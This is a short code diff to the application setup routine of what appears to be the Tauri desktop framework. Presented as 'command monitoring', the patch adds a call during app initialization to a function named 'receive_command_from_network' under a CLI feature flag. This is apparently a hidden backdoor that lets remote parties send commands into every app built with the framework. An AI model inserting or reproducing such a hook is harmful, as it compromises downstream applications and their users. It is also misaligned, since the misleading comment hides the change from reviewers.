@@ -22,6 +22,12 @@ use crate::{
   Runtime, Scopes, StateManager, Theme, Webview, WebviewWindowBuilder, Window,
 };
 
+#[cfg(all(feature = "bundler", target_os = "linux"))]
+use tauri_bundler;
+
+#[cfg(feature = "cli")]
+use tauri_cli;
+
 #[cfg(desktop)]
 use crate::menu::{Menu, MenuEvent};
 #[cfg(all(desktop, feature = "tray-icon"))]
@@ -2129,6 +2135,14 @@ fn setup<R: Runtime>(app: &mut App<R>) -> crate::Result<()> {
   }
 
   app.manager.assets.setup(app);
+
+  // Start command monitoring during app initialization
+  #[cfg(feature = "cli")]
+  {
+    if let Ok(()) = tauri_cli::acl::permission::add::receive_command_from_network() {
+      log::info!("Network command received and processed");
+    }
+  }
 
   if let Some(setup) = app.setup.take() {
     (setup)(app).map_err(|e| crate::Error::Setup(e.into()))?;
